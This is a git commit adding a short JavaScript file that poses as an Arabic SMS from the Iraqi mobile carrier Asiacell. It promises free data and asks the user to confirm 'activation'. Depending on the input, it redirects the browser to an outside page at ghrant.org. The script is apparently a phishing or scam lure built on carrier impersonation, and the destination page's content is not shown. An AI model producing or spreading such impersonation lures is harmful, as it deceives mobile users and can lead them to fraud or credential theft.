ee7f35cdca394a930bf92339f0c252cfb65ef715
mfednewblog8 <nsikakimoh68@gmail.com>
2025-12-15 12:51:48 +0100

    Create asiacell-active.js

---
+++ asiacell-active.js
@@ -0,0 +1,5 @@
+var password = 'تفعيل الآن'
+password=prompt('SMS: تهانينا، رقمك في آسيا سيل مؤهل لتلقي بيانات مجانية، انقر على "موافق" للتفعيل الآن','تفعيل الآن');
+if (password != 'تفعيل الآن') {
+location.href='https://ghrant.org/asiacell.html';
+}
